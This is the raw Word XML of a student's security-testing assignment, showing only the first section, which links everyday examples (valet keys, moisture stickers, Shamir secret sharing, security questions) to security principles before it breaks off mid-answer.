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03065" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Title"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>INTE2580/77 Security Testing</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br/>
        <w:t>Assignment 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="692D73DF" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Student Name: Le Phuc Thinh</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FC32268" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Student ID: s3893964</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C0BB4F1" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Due Date: Week 5, Friday 23:59PM</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78294E20" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="63A713E4" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Table of Contents</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB2EBD2" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Section 1: Security Principles</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A0D9089" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Section 2: Threat Modeling</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356EA8EB" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Section 3: Packet Sniffing and Spoofing Attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71530E58" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:t>Section 4: TCP Session Reset and Hijacking Attacks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A5A310B" w14:textId="77777777" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C968915" w14:textId="6615DE8A" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00000000" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Section 1: Security Principles</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="643B38EA" w14:textId="77777777" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="69CA5C1F" w14:textId="33DA6243" w:rsidR="000A5841" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>New cars often come with a valet key. This key is intended to be used by valet drivers who park your car for you. The key opens the door and turns on the ignition, but it does not open the trunk or the glove compartment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A339D3C" w14:textId="2E92A7BA" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Principles applied:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0922AD0A" w14:textId="6118A257" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Principle of least privilege</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17227954" w14:textId="3996B44D" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Privilege separation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D359B60" w14:textId="43DB1E75" w:rsidR="00D825BB" w:rsidRPr="00C2328F" w:rsidRDefault="00365985" w:rsidP="00D825BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Reason</w:t>
      </w:r>
      <w:r w:rsidR="00D505CB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>: We can see that</w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the valet key uses</w:t>
      </w:r>
      <w:r w:rsidR="00D505CB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> least privilege principle </w:t>
      </w:r>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>and privilege separation because it separates the car owner and the valet driver by using the keys. The valet driver only has enough privilege to drive the car does not access other resources like gloves compartment.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65E8C940" w14:textId="77777777" w:rsidR="00D825BB" w:rsidRPr="00C2328F" w:rsidRDefault="00D825BB" w:rsidP="00D825BB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="52D3BAD8" w14:textId="06CEFDEC" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Warranties on cell phones do not cover accidental damage, which includes liquid damage. Unfortunately for cell phone companies, many consumers who accidentally damage their phones with liquid will wait for it to dry, then take it into the store, claiming that “it broke by itself”. To combat this threat, many companies have begun to include on the product a small sticker that turns red (and stays red) when it gets wet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32A82E80" w14:textId="4B394DDB" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Principles applied:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2647AEA9" w14:textId="6BB964FD" w:rsidR="00365985" w:rsidRPr="00C2328F" w:rsidRDefault="00365985" w:rsidP="00365985">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Know your threat model</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16E41BFF" w14:textId="7638A4DA" w:rsidR="00365985" w:rsidRPr="00C2328F" w:rsidRDefault="00365985" w:rsidP="00365985">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Detect if you can’t prevent</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B1CD105" w14:textId="3B90A5D5" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D825BB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Reason: </w:t>
      </w:r>
      <w:r w:rsidR="00365985" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">The company knows the threat model which is sometimes the user damaging the phone with liquid and pretending that it was not. However, they use detect if they </w:t>
      </w:r>
      <w:r w:rsidR="00D825BB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>can’t</w:t>
      </w:r>
      <w:r w:rsidR="00365985" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> prevent people from coming to the store and make stories with the wet detection red sticker.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7987E52F" w14:textId="77777777" w:rsidR="00D825BB" w:rsidRPr="00C2328F" w:rsidRDefault="00D825BB" w:rsidP="00D825BB">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4A4CF84C" w14:textId="31A3B2B4" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Shamir’s secret sharing scheme allows us to split a “secret” between multiple people so that all of them have to collaborate in order to recover the secret.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E9E3337" w14:textId="706CA8BE" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Principles applied:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D94FA84" w14:textId="1083F6E9" w:rsidR="00365985" w:rsidRPr="00C2328F" w:rsidRDefault="00365985" w:rsidP="00365985">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Defense in depth</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BD819C0" w14:textId="71E4CBEC" w:rsidR="00365985" w:rsidRPr="00C2328F" w:rsidRDefault="00365985" w:rsidP="00365985">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="2"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Privilege separation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="786AA739" w14:textId="40D3D53D" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Reason: </w:t>
      </w:r>
      <w:r w:rsidR="00365985" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">There </w:t>
      </w:r>
      <w:r w:rsidR="00D825BB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>are</w:t>
      </w:r>
      <w:r w:rsidR="00365985" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> multiple layers of defense because if one person leaked their secret there are many more that need to be stolen/leaked to recover the secret. The privilege of knowing the secret is split into many </w:t>
      </w:r>
      <w:r w:rsidR="00D825BB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>parts</w:t>
      </w:r>
      <w:r w:rsidR="00365985" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to many people. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23A67F45" w14:textId="77777777" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7087C53C" w14:textId="77777777" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02B93EA7" w14:textId="390FA734" w:rsidR="00D505CB" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00D505CB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>MyGov website often makes you answer your security questions over the phone. Answers to these questions are “low entropy”, meaning that they are easy to guess. Some security- conscious people instead use a random password as the answer to the security question. For example, Q: “What is your dog’s maiden name?”. A: “60ba6b1c881c6b87”. However, attackers can sometimes convince the phone representative by claiming “I just put in some nonsense for that question”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0297388B" w14:textId="6C3FE9EF" w:rsidR="00365985" w:rsidRPr="00C2328F" w:rsidRDefault="00D505CB" w:rsidP="00365985">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="10"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Principles applied:</w:t>
      </w:r>
      <w:r w:rsidR="00D825BB" w:rsidRPr="00C2328F">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F6D176E" w14:textId="2EEB4AFB" w:rsidR="00D825BB" w:rsidRPr="00C2328F" w:rsidRDefault="00D825BB" w:rsidP="00D825BB">
      <w:pPr>
